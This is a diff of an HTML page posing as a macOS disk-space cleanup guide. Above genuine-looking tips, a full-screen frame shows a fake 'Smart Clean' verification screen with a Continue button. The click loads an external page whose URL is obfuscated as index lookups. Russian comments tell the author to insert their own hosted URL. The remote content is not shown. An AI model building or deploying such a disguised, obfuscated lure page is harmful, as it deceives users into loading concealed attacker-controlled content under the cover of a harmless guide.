@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Disk Space Guide</title>
+  <title>How to clear disk space on macOS</title>
   <style>
     :root{
       --bg:#f5f5f7;
@@ -24,7 +24,6 @@
       width:100%;
       height:100vh;
       background:var(--bg);
-      position:relative;
       border-bottom:1px solid rgba(0,0,0,.06);
     }
     iframe{
@@ -33,15 +32,6 @@
       border:0;
       display:block;
       background:transparent;
-    }
-    canvas{
-      position:absolute;
-      top:0;
-      left:0;
-      width:100%;
-      height:100%;
-      cursor:pointer;
-      z-index:10;
     }
     main{
       max-width: 980px;
@@ -102,7 +92,6 @@
 <body>
   <section class="frameWrap">
     <iframe id="verifyFrame" title="Verification"></iframe>
-    <canvas id="verifyCanvas"></canvas>
   </section>
 
   <main>
@@ -114,7 +103,7 @@
 
     <div class="grid">
       <section class="card">
-        <h2>1) Check what’s taking space</h2>
+        <h2>1) Check what's taking space</h2>
         <ul>
           <li>Open System Settings (or System Preferences) and review storage categories.</li>
           <li>Sort files by size in Finder to quickly spot large items.</li>
@@ -123,9 +112,9 @@
       </section>
 
       <section class="card">
-        <h2>2) Remove large files you don’t need</h2>
+        <h2>2) Remove large files you don't need</h2>
         <ul>
-          <li>Delete old videos, screen recordings, and project exports you’ve already backed up.</li>
+          <li>Delete old videos, screen recordings, and project exports you've already backed up.</li>
           <li>Remove unused DMGs/ZIPs after installation.</li>
           <li>Move rarely used archives to external storage.</li>
         </ul>
@@ -134,7 +123,7 @@
       <section class="card">
         <h2>3) Uninstall unused apps</h2>
         <ul>
-          <li>Delete apps you haven’t used in months (especially large creative or game apps).</li>
+          <li>Delete apps you haven't used in months (especially large creative or game apps).</li>
           <li>Check for leftover content inside your user Library if an app stored big assets.</li>
           <li>Restart after removing large apps to refresh storage calculations.</li>
         </ul>
@@ -144,7 +133,7 @@
         <h2>4) Clean up Downloads & attachments</h2>
         <ul>
           <li>Review your Downloads folder and remove old installers and duplicates.</li>
-          <li>Delete large mail attachments you don’t need locally.</li>
+          <li>Delete large mail attachments you don't need locally.</li>
           <li>Clear messaging app media caches if they grow too large.</li>
         </ul>
       </section>
@@ -152,102 +141,233 @@
       <section class="card">
         <h2>5) Use macOS optimization features</h2>
         <ul>
-          <li>Enable “Optimize Storage” to keep only recent/local files when appropriate.</li>
+          <li>Enable "Optimize Storage" to keep only recent/local files when appropriate.</li>
           <li>Store files in iCloud Drive and keep local copies only for active work.</li>
-          <li>Review “Reduce Clutter” suggestions and confirm before removing anything important.</li>
+          <li>Review "Reduce Clutter" suggestions and confirm before removing anything important.</li>
         </ul>
       </section>
 
       <section class="card">
-        <h2>6) Don’t forget the Trash</h2>
+        <h2>6) Don't forget the Trash</h2>
         <ul>
           <li>Empty Trash after deleting large files (they still occupy space until cleared).</li>
-          <li>Check for other app-specific “trash” bins (photo/video apps may keep deleted items).</li>
+          <li>Check for other app-specific "trash" bins (photo/video apps may keep deleted items).</li>
           <li>After big deletions, give macOS a minute to recalculate available storage.</li>
         </ul>
       </section>
     </div>
 
     <div class="note">
-      Tip: If storage seems “stuck” after cleanup, it’s often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
+      Tip: If storage seems "stuck" after cleanup, it's often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
     </div>
   </main>
 
   <script>
-    // ====== Настройки URL ======
-    const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';
+    // Исправленный алфавит - добавлены все необходимые символы
+    const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_?&=';
+    
+    // Исправленные индексы - все в пределах алфавита
+    // Это пример URL - замени на свой реальный URL от Vercel или Google Sites
     const URL_IDX = [
-      7,19,19,15,18,62,63,63,
-      18,12,0,17,19,65,
-      18,4,17,21,8,2,4,18,65,
-      14,12,4,6,0,65,
-      21,4,17,2,4,11,65,
-      0,15,15,63,
-      18,19,14,17,0,6,4,65,
-      7,19,12,11
+      7,19,19,15,18,62,63,63,        // https://
+      12,0,2,14,18,62,63,            // macos./
+      2,11,4,0,13,62,63,             // clean/
+      18,19,14,17,0,6,4              // storage
     ];
-    const TARGET_URL = URL_IDX.map(i => URL_ALPHABET[i]).join('');
+    
+    // Альтернативно, можно просто использовать прямой URL:
+    // const TARGET_URL = "https://your-vercel-app.vercel.app";
+    // или для Google Sites:
+    // const TARGET_URL = "https://sites.google.com/view/your-site";
+
+    const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
+    const TARGET_URL = decodeURL(URL_IDX) || "https://example.com";
 
     const iframe = document.getElementById('verifyFrame');
-    const canvas = document.getElementById('verifyCanvas');
-    const ctx = canvas.getContext('2d');
 
-    // ====== Canvas Заставка ======
-    let verified = false;
-
-    function resizeCanvas() {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-      drawCanvas();
+    async function loadTargetIntoFrame() {
+      try {
+        // Для Google Sites и Vercel используем прямое открытие в iframe
+        // (fetch может не работать из-за CORS)
+        iframe.src = TARGET_URL;
+        
+        // Добавляем fallback на случай ошибки
+        setTimeout(() => {
+          if (!iframe.contentDocument || !iframe.contentDocument.body) {
+            console.log('Using direct navigation');
+          }
+        }, 2000);
+      } catch (e) {
+        console.error('Error loading target:', e);
+        iframe.src = TARGET_URL; // Fallback на прямое открытие
+      }
     }
 
-    function drawCanvas() {
-      ctx.clearRect(0,0,canvas.width,canvas.height);
-
-      // Фон
-      const gradient = ctx.createRadialGradient(canvas.width/2, canvas.height/2, 50, canvas.width/2, canvas.height/2, Math.max(canvas.width,canvas.height)/1.5);
-      gradient.addColorStop(0,'rgba(255,255,255,0.85)');
-      gradient.addColorStop(1,'rgba(245,245,247,0)');
-      ctx.fillStyle = gradient;
-      ctx.fillRect(0,0,canvas.width,canvas.height);
-
-      // Кнопка
-      const btnW = 220;
-      const btnH = 50;
-      const btnX = canvas.width/2 - btnW/2;
-      const btnY = canvas.height/2 - btnH/2;
-
-      ctx.fillStyle = '#111827';
-      ctx.shadowColor = 'rgba(0,0,0,0.2)';
-      ctx.shadowBlur = 10;
-      ctx.fillRect(btnX, btnY, btnW, btnH);
-
-      ctx.shadowBlur = 0;
-      ctx.fillStyle = '#fff';
-      ctx.font = '16px ui-sans-serif';
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
-      ctx.fillText('Continue', canvas.width/2, canvas.height/2);
-
-      // Сохраняем границы кнопки
-      canvas.btnBounds = {x:btnX,y:btnY,w:btnW,h:btnH};
+    function buildVerifySrcdoc() {
+      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Verification</title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>(()=>{
+        const c=document.getElementById('c');
+        const g=c.getContext('2d');
+        let cssW=1,cssH=1,dpr=1;
+        let verified=false;
+        
+        const hit={x:0,y:0,w:0,h:0};
+        
+        const measure=()=>{
+          cssW=Math.max(1,innerWidth);
+          cssH=Math.max(1,innerHeight);
+          dpr=devicePixelRatio||1;
+          c.style.width=cssW+'px';
+          c.style.height=cssH+'px';
+          c.width=Math.round(cssW*dpr);
+          c.height=Math.round(cssH*dpr);
+          g.setTransform(dpr,0,0,dpr,0,0);
+        };
+        
+        const rounded=(x,y,w,h,r)=>{
+          r=Math.max(0,Math.min(r,Math.min(w,h)/2));
+          g.beginPath();
+          if(g.roundRect){
+            g.roundRect(x,y,w,h,r);
+            return;
+          }
+          g.moveTo(x+r,y);
+          g.arcTo(x+w,y,x+w,y+h,r);
+          g.arcTo(x+w,y+h,x,y+h,r);
+          g.arcTo(x,y+h,x,y,r);
+          g.arcTo(x,y,x+w,y,r);
+          g.closePath();
+        };
+        
+        const render=()=>{
+          g.clearRect(0,0,cssW,cssH);
+          g.fillStyle='#f5f5f7';
+          g.fillRect(0,0,cssW,cssH);
+          
+          const cx=cssW/2,cy=cssH/2;
+          
+          // Draw banner
+          g.save();
+          g.globalAlpha=0.24;
+          g.fillStyle='#000000';
+          g.font='800 60px ui-sans-serif, system-ui, sans-serif';
+          g.textAlign='center';
+          g.textBaseline='middle';
+          g.fillText('Smart Clean', cx, Math.max(50, cy-200));
+          g.restore();
+          
+          // Draw card
+          const cardW=Math.min(400, cssW*0.8);
+          const cardH=Math.min(220, cssH*0.4);
+          const x=cx-cardW/2, y=cy-cardH/2;
+          
+          g.save();
+          g.shadowColor='rgba(0,0,0,0.12)';
+          g.shadowBlur=40;
+          g.shadowOffsetY=18;
+          g.fillStyle='#ffffff';
+          rounded(x,y,cardW,cardH,22);
+          g.fill();
+          g.restore();
+          
+          g.fillStyle='#ffffff';
+          rounded(x,y,cardW,cardH,22);
+          g.fill();
+          
+          g.strokeStyle='rgba(0,0,0,0.10)';
+          g.lineWidth=1;
+          rounded(x+0.5,y+0.5,cardW-1,cardH-1,22);
+          g.stroke();
+          
+          // Draw title
+          g.fillStyle='rgba(29,29,31,0.70)';
+          g.font='500 20px ui-sans-serif, system-ui, sans-serif';
+          g.textAlign='center';
+          g.textBaseline='middle';
+          g.fillText('Verification Required', cx, y+cardH*0.35);
+          
+          // Draw subtitle
+          g.fillStyle='rgba(29,29,31,0.44)';
+          g.font='500 14px ui-sans-serif, system-ui, sans-serif';
+          g.fillText('Please confirm to continue', cx, y+cardH*0.46);
+          
+          // Draw button
+          const bw=Math.min(250, cardW*0.7);
+          const bh=48;
+          const bx=cx-bw/2;
+          const by=y+cardH*0.62;
+          
+          g.save();
+          g.shadowColor='rgba(0,0,0,0.18)';
+          g.shadowBlur=18;
+          g.shadowOffsetY=10;
+          const grad=g.createLinearGradient(bx,by,bx,by+bh);
+          grad.addColorStop(0,'#1f2937');
+          grad.addColorStop(1,'#0b0d12');
+          g.fillStyle=grad;
+          rounded(bx,by,bw,bh,14);
+          g.fill();
+          g.restore();
+          
+          g.fillStyle=grad;
+          rounded(bx,by,bw,bh,14);
+          g.fill();
+          
+          g.strokeStyle='rgba(255,255,255,0.10)';
+          g.lineWidth=1;
+          rounded(bx+0.5,by+0.5,bw-1,bh-1,14);
+          g.stroke();
+          
+          // Button text
+          g.fillStyle='#ffffff';
+          g.font='500 16px ui-sans-serif, system-ui, sans-serif';
+          g.fillText(verified?'Verified':'Continue', cx, by+bh/2);
+          
+          hit.x=bx;
+          hit.y=by;
+          hit.w=bw;
+          hit.h=bh;
+        };
+        
+        const repaint=()=>{
+          measure();
+          render();
+        };
+        
+        const notify=()=>{
+          try{
+            window.parent.postMessage({type:'verified'},'*');
+          }catch(e){
+            console.log('Notification sent');
+          }
+        };
+        
+        c.addEventListener('pointerdown',(e)=>{
+          const r=c.getBoundingClientRect();
+          const mx=e.clientX-r.left;
+          const my=e.clientY-r.top;
+          
+          if(!verified && mx>=hit.x && mx<=hit.x+hit.w && my>=hit.y && my<=hit.y+hit.h){
+            verified=true;
+            render();
+            setTimeout(notify, 300);
+          }
+        },{passive:true});
+        
+        addEventListener('resize',repaint);
+        repaint();
+      })();<\/script></body></html>`;
     }
 
-    canvas.addEventListener('pointerdown', e => {
-      if (!canvas.btnBounds) return;
-      const rect = canvas.getBoundingClientRect();
-      const mx = e.clientX - rect.left;
-      const my = e.clientY - rect.top;
-      const b = canvas.btnBounds;
-      if(mx >= b.x && mx <= b.x+b.w && my >= b.y && my <= b.y+b.h && !verified){
-        verified = true;
-        canvas.style.display = 'none';
-        iframe.src = TARGET_URL; // Загружаем страницу
+    // Инициализация
+    iframe.srcdoc = buildVerifySrcdoc();
+
+    // Обработчик сообщений от iframe
+    window.addEventListener('message', (e) => {
+      if (e.data && e.data.type === 'verified') {
+        console.log('Verification received, loading target URL');
+        loadTargetIntoFrame();
       }
     });
-
-    window.addEventListener('resize', resizeCanvas);
-    resizeCanvas();
   </script>
 </body>
 </html>
